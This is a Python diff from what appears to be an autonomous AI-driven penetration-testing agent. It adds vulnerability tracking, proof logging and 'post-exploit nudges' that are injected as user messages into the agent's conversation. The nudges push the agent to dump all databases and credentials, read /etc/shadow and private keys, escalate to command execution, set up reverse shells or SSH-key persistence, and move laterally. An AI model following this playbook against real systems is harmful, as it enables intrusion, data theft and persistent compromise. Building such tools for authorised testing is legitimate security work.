+                is_404 = ("404 - file or directory not found" in out_lower) or ("<title>404" in out_lower)
+                if is_404:
+                    recent = v.get("attempts", [])[-3:]
+                    hits_404 = 0
+                    for a in recent:
+                        ev = str((a or {}).get("evidence") or "").lower()
+                        if "404 - file or directory not found" in ev or "<title>404" in ev:
+                            hits_404 += 1
+                    if hits_404 >= 2 and not (v.get("not_exploitable_reason") or "").strip():
+                        v["not_exploitable_reason"] = (
+                            "Repeated /debug.aspx exploitation attempts returned IIS 404. "
+                            "Likely decoy/false positive; pivoting to other attack surfaces."
+                        )
+                        if self.current_vuln_focus_id == vuln_id:
+                            self.current_vuln_focus_id = None
+                        # Persist and relax the gate if nothing else is pending.
+                        self._save_vuln_tracker()
+                        self._sync_structured_findings_from_vuln_tracker()
+                        self._save_structured_findings()
+                        if not self._get_unexploited_findings():
+                            self.all_vulns_resolved = True
+                            self.force_exploit_next = False
+                            self.exploit_only_hard = False
+                            self.phase_force_exploit = False
+                        self._log(f"FALSE POSITIVE AUTO-SKIP: {vuln_id} marked not exploitable (debug.aspx 404)", "WARN")
+        except Exception:
+            pass
+
         # Throttle vuln tracker writes: only every 5 attempts or on first attempt
         if v["attempt_count"] <= 1 or v["attempt_count"] % 5 == 0:
             self._save_vuln_tracker()
+        else:
+            # Keep structured findings attempts fresh even when tracker write is throttled.
+            self._sync_structured_findings_from_vuln_tracker()
+            self._save_structured_findings()
 
     def _mark_vuln_proven(self, vuln_id: str, proof: str) -> None:
         """Mark vuln as exploited only when we have success+proof."""
@@ -5535,6 +8820,37 @@ Continue the assessment - provide the next commands."""
             v["not_exploitable_reason"] = ""
         self._save_vuln_tracker()
         self._log(f"[REMEMBER: vulnerability_proven] {v.get('type','')} at {v.get('target','')} — proof collected", "INFO")
+        # Persist a human-readable proof artifact immediately (helps the UI show "real exploitation"
+        # while the job is still running, rather than only at final report generation).
+        try:
+            ev_dir = os.path.join(self.log_dir, "evidence")
+            os.makedirs(ev_dir, exist_ok=True)
+            safe_id = re.sub(r"[^a-zA-Z0-9_.-]+", "_", vuln_id)[:80]
+            p = os.path.join(ev_dir, f"proof_{safe_id}.txt")
+            with open(p, "w") as f:
+                f.write((proof or "")[:2000])
+        except Exception:
+            pass
+
+        # Emit access.json immediately so the control-plane can reflect "access gained"
+        # while the job is still running (not only after final report parsing).
+        try:
+            self._update_access_json_from_proof(vuln_id, v, proof or "")
+        except Exception as e:
+            self._log(f"access.json update failed (non-fatal): {e}", "WARN")
+
+        # ── P1 Feature 5: Save guide for successful exploitation technique ──
+        try:
+            self._save_guide(v, proof or "")
+        except Exception:
+            pass
+
+        # Post-proof deepening hold: require concrete impact actions before pivoting/scanning away.
+        try:
+            self._activate_post_proof_hold(vuln_id, v.get("target") or self.target or "")
+        except Exception:
+            pass
+
         # Clear focus so next iteration picks a fresh target
         if self.current_vuln_focus_id == vuln_id:
             self.current_vuln_focus_id = None
@@ -5545,13 +8861,53 @@ Continue the assessment - provide the next commands."""
         except Exception:
             pass
 
-        # Spec 009: Auto-pivot to next unproven vuln after proof
+        # Post-exploitation deepening nudge: tell the agent to extract maximum value
+        # BEFORE pivoting to the next vulnerability
+        try:
+            vtype_nudge = v.get("type", "unknown")
+            vtarget_nudge = v.get("target", self.target or "unknown")
+            proof_text_nudge = v.get("exploit_evidence", "")
+            nudge_parts = [
+                f"🔥 **EXPLOITATION PROVEN: {vtype_nudge} at {vtarget_nudge}** — Now DEEPEN the exploitation:",
+            ]
+            # Tailor the nudge based on vuln type
+            vtype_lower = vtype_nudge.lower()
+            if "sql" in vtype_lower or "injection" in vtype_lower or "database" in vtype_lower:
+                nudge_parts.append("• Dump ALL database tables — extract usernames, passwords, emails, secrets")
+                nudge_parts.append("• Check for stacked queries → OS command execution (xp_cmdshell, LOAD_FILE, INTO OUTFILE)")
+                nudge_parts.append("• Read sensitive files via DB functions if possible")
+            elif "rce" in vtype_lower or "command" in vtype_lower or "code execution" in vtype_lower:
+                nudge_parts.append("• Run: id, whoami, cat /etc/passwd, cat /etc/shadow (if root)")
+                nudge_parts.append("• Check sudo -l, SUID binaries, capabilities, cron jobs for privesc")
+                nudge_parts.append("• Read config files, .env, database credentials, private keys")
+                nudge_parts.append("• Establish persistent access if allowed (reverse shell, SSH key)")
+            elif "lfi" in vtype_lower or "traversal" in vtype_lower or "file" in vtype_lower:
+                nudge_parts.append("• Read: /etc/shadow, /etc/hosts, .bash_history, .env, config files")
+                nudge_parts.append("• Look for SSH keys, database credentials, API tokens")
+                nudge_parts.append("• Try to escalate LFI to RCE (log poisoning, /proc/self/environ, PHP wrappers)")
+            elif "auth" in vtype_lower or "jwt" in vtype_lower or "token" in vtype_lower or "cred" in vtype_lower:
+                nudge_parts.append("• Use the credentials/tokens to access ALL protected endpoints")
+                nudge_parts.append("• Dump user data, admin panels, sensitive API responses")
+                nudge_parts.append("• Check for privilege escalation (change role to admin, access other users)")
+            else:
+                nudge_parts.append("• Extract sensitive data: credentials, configs, database contents")
+                nudge_parts.append("• Check for privilege escalation opportunities")
+                nudge_parts.append("• Use any discovered credentials for lateral movement")
+            nudge_parts.append("• Then proceed to the next target.")
+            nudge_msg = "\n".join(nudge_parts)
+            self.conversation.append({"role": "user", "content": nudge_msg})
+            self._log(f"POST-EXPLOIT NUDGE injected for {vuln_id}: deepen exploitation of {vtype_nudge}", "INFO")
+        except Exception as e:
+            self._log(f"Post-exploit nudge error (non-fatal): {e}", "WARN")
+
+        # Spec 009: Auto-pivot to next unproven vuln after proof (only if other vulns remain).
         self.last_proof_iteration = self.iteration
         try:
-            pivot_msg = self._auto_pivot_after_proof()
-            if pivot_msg:
-                self.conversation.append({"role": "user", "content": pivot_msg})
-                self._log(f"AUTO-PIVOT after proof of {vuln_id}: next={self.current_vuln_focus_id}", "INFO")
+            if self._get_unproven_vulns():
+                pivot_msg = self._auto_pivot_after_proof(vuln_id)
+                if pivot_msg:
+                    self.conversation.append({"role": "user", "content": pivot_msg})
+                    self._log(f"AUTO-PIVOT after proof of {vuln_id}: next={self.current_vuln_focus_id}", "INFO")
         except Exception:
             pass
 
@@ -5649,6 +9005,8 @@ Continue the assessment - provide the next commands."""
             "status code", "http/", "error:", "syntax error", "stack trace",
             "successful", "gained access", "logged in as", "authenticated as",
             "proof:", "evidence:", "output:", "result:",
+            # Access-gained style indicators (the category is not passed in, so key off text)
+            "rce", "shell", "webshell", "web shell", "reverse shell", "www-data", "uid=",
         ]
         has_evidence = any(ind in content_lower for ind in evidence_indicators)
         
@@ -5674,7 +9032,10 @@ Continue the assessment - provide the next commands."""
             if any(p in content_lower for p in patterns):
                 # Extract target from content if possible
                 target = self.target or "unknown"
-                self._track_vuln_found(vuln_type, target, content[:200])
+                # Strip LLM reasoning/internal monologue from details field.
+                # Only keep factual technical details, not the model's thought process.
+                clean_details = self._strip_llm_reasoning(content[:400])
+                self._track_vuln_found(vuln_type, target, clean_details[:200])
         
         # Check if this is exploitation evidence
         exploit_evidence_patterns = [
@@ -5720,29 +9081,104 @@ Continue the assessment - provide the next commands."""
             f.write(comprehensive_md)
         self._log(f"Comprehensive report saved: {report_file}")
         
-        # Extract exploitation results from conversation
+        # Exploitation results must be derived from concrete proof/artifacts, not assistant narration.
         exploitation_results = {
             "credentials": [],
             "shells": [],
             "backdoors": [],
             "databases": [],
-            "files": []
+            "files": [],
         }
-        
-        # Parse conversation for results
-        for msg in self.conversation:
-            if msg.get("role") == "assistant":
-                content = msg.get("content", "").lower()
-                if "password" in content and ":" in content:
-                    exploitation_results["credentials"].append("Credentials extracted")
-                if "webshell" in content or "shell.php" in content:
-                    exploitation_results["shells"].append("Webshell deployed")
-                if "reverse shell" in content:
-                    exploitation_results["shells"].append("Reverse shell available")
-                if "backdoor" in content or "svc_" in content:
-                    exploitation_results["backdoors"].append("Backdoor account created")
-                if "dump" in content or "database" in content:
-                    exploitation_results["databases"].append("Database accessed")
+        try:
+            proven = []
+            for vid, v in (self.vulns_found or {}).items():
+                if not isinstance(v, dict):
+                    continue
+                proof = (v.get("proof") or "").strip()
+                if not proof:
+                    continue
+                proven.append((vid, v, proof))
+
+            for _vid, v, proof in proven:
+                pl = proof.lower()
+                label = f"{v.get('type','unknown')} @ {v.get('target','?')}"
+
+                # Shell / code-exec proof (high-signal only).
+                if any(
+                    m in pl
+                    for m in (
+                        "uid=",
+                        "nt authority\\system",
+                        "meterpreter",
+                        "session opened",
+                        "command shell",
+                        "ps c:\\",
+                        "powershell",
+                    )
+                ):
+                    exploitation_results["shells"].append(label)
+
+                # Database access proof.
+                if any(
+                    m in pl
+                    for m in (
+                        "available databases",
+                        "database:",
+                        "table:",
+                        "information_schema",
+                        "pg_catalog",
+                        "mysql>",
+                        "mssql>",
+                        "sql>",
+                        "postgres=#",
+                        "postgres=>",
+                    )
+                ):
+                    exploitation_results["databases"].append(label)
+
+                # Sensitive file/data proof.
+                if any(
+                    m in pl
+                    for m in (
+                        "root:x:",
+                        "/etc/passwd",
+                        "/etc/shadow",
+                        "begin rsa private key",
+                        "ssh-rsa",
+                        "api_key",
+                        "apikey",
+                        "token",
+                    )
+                ):
+                    exploitation_results["files"].append(label)
+
+                # Basic persistence/backdoor hints (still proof-based).
+                if any(m in pl for m in ("authorized_keys", "crontab", "schtasks", "reg add", "sc create")):
+                    exploitation_results["backdoors"].append(label)
+
+            # Credentials/tokens from arsenal (redacted; do not rely on assistant text).
+            for c in (self.arsenal or {}).get("credentials", [])[:10]:
+                val = str(c.get("value", "") or "")
+                if val:
+                    exploitation_results["credentials"].append(self._redact_sensitive(val)[:80])
+            for t in (self.arsenal or {}).get("tokens", [])[:5]:
+                val = str(t.get("value", "") or "")
+                if val:
+                    exploitation_results["credentials"].append("token:" + self._redact_sensitive(val)[:20] + "...")
+
+            # Deduplicate (stable, case-insensitive).
+            for key in list(exploitation_results.keys()):
+                seen = set()
+                deduped = []
+                for item in exploitation_results.get(key, []) or []:
+                    k = str(item).strip().lower()
+                    if not k or k in seen:
+                        continue
+                    seen.add(k)
+                    deduped.append(item)
+                exploitation_results[key] = deduped
+        except Exception:
+            pass
         
         report = {
             "timestamp": datetime.now(timezone.utc).isoformat(),
